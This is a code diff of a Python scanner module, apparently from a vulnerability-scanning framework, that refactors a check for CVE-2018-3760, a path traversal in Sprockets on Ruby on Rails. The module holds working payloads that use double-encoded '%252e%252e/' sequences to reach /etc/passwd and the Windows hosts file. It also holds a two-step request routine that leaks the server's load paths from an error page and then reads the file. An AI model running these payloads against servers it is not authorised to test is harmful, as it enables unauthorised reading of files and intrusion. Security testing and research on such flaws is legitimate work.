@@ -1,90 +1,79 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from thirdparty import requests
-from time import sleep
+from lib.tool import check
 import re
 
-def cve_2018_3760_scan(self, url):
+cve_2018_3760_payloads = [
+    {
+        'path-1': 'assets/file:%2f%2f/etc/passwd',
+        'path-2': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
+    },
+    {
+        'path-1': 'assets/file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
+        'path-2': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
+    },
+    {
+        'path-1': 'file:%2f%2f/etc/passwd',
+        'path-2': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
+    },
+    {
+        'path-1': 'file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
+        'path-2': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
+    },
+]
+
+def cve_2018_3760_scan(self, clients):
     ''' 在开发环境中使用 Sprockets 作为静态文件服务器
         Sprockets 3.7.1及更低版本存在二次解码导致的路径遍历漏洞, 攻击者可以使用%252e%252e/访问根目录并读取或执行目标服务器上的任何文件
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'File-Read'
-    vul_info['vul_id'] = 'CVE-2018-3760'
-    vul_info['vul_method'] = 'GET'
-    vul_info['headers'] = {}
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'File-Read',
+        'vul_id': 'CVE-2018-3760',
+    }
 
-    # headers = self.headers.copy()
-    # headers.update(vul_info['headers'])
+    for payload in cve_2018_3760_payloads:
+        # todo 1/ 第一个请求, 寻找 RoR的load路径, 根据路径尝试FileRead漏洞
+        path_1 = payload['path-1']
 
-    for payload in range(len(self.cve_2018_3760_payloads)):
-        path = self.cve_2018_3760_payloads[payload]['path']
-        target = url + path
-
-        vul_info['path'] = path
-        vul_info['target'] = target
+        res1 = client.request(
+            'get',
+            path_1,
+            allow_redirects=False,
+            vul_info=vul_info
+        )
+        if res1 is None:
+            continue
 
         load_path_re = r'<h2>.* is no longer under a load path: .*/.{0,30}</h2>'
+        load_path_search = re.search(load_path_re, res1.text, re.I|re.M|re.U|re.S)
+        
+        if load_path_search:
+            load_path_s = load_path_search.group(0).lstrip('<h2>').rstrip('</h2>')
+            load_path_s = load_path_s.replace('/etc/passwd is no longer under a load path: ', '')
+            load_path_s = load_path_s.replace('C:/Windows/System32/drivers/etc/hosts is no longer under a load path: ', '')
+            load_path_list = load_path_s.split(', ')
 
-        try:
-            if (payload % 2 == 0):
-                res1 = requests.get(                                                # * 获取允许的路径(路径白名单)
-                    target, 
-                    timeout=self.timeout, 
-                    headers=self.headers,
-                    proxies=self.proxies, 
-                    verify=False,
-                    allow_redirects=False
+            for load_path in load_path_list:
+                path_2 = payload['path-2'].format(load_path)
+
+                res2 = client.request(
+                    'get',
+                    path_2,
+                    allow_redirects=False,
+                    vul_info=vul_info
                 )
-                logger.logging(vul_info, res1.status_code, res1)                    # * LOG
-
-                load_path_search = re.search(load_path_re, res1.text, re.I|re.M|re.U|re.S)
-                if load_path_search:
-                    path = self.cve_2018_3760_payloads[payload+1]['path']
-
-                    load_path_s = load_path_search.group(0).lstrip('<h2>').rstrip('</h2>')
-                    load_path_s = load_path_s.replace('/etc/passwd is no longer under a load path: ', '')
-                    load_path_s = load_path_s.replace('C:/Windows/System32/drivers/etc/hosts is no longer under a load path: ', '')
-                    load_path_list = load_path_s.split(', ')
-
-                    for load_path in load_path_list:
-                        sleep(0.5)
-                        target = url + path.format(load_path)
-
-                        res2 = requests.get(
-                            target, 
-                            timeout=self.timeout, 
-                            headers=self.headers,
-                            proxies=self.proxies, 
-                            verify=False,
-                            allow_redirects=False
-                        )
-                        logger.logging(vul_info, res2.status_code, res2)                        # * LOG
-
-                        if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res2.text, re.I|re.M|re.S)
-                            or (('Microsoft Corp' in res2.text) 
-                                and ('Microsoft TCP/IP for Windows' in res2.text))
-                        ):
-                            results = {
-                                'Target': target,
-                                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                                'Request': res2
-                            }
-                            return results
-                else:
+                if res2 is None:
                     continue
-            else:
-                continue
 
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+                if (check.check_res_fileread(res2.text)):
+                    results = {
+                        'Target': res2.request.url,
+                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                        'Request': res2
+                    }
+                    return results
+    return None
